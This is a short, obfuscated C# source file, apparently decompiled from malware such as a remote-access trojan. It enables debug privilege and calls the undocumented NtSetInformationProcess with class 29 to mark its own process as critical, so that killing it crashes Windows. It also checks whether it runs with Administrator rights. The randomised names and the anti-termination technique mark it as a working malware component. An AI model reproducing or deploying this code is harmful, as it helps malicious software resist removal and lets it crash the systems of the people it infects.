using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace eltZnUpwRizyZ;

public static class UHfukmSRDidq
{
	[DllImport("ntdll.dll", EntryPoint = "NtSetInformationProcess", SetLastError = true)]
	private static extern int fWuWRgKTlfyWhBS(IntPtr P_0, int P_1, ref int P_2, int P_3);

	public static void UERnhubenVRN()
	{
		int num = 1;
		int num2 = 29;
		Process.EnterDebugMode();
		fWuWRgKTlfyWhBS(Process.GetCurrentProcess().Handle, num2, ref num, 4);
	}

	public static bool ETgVlCMUDmun()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
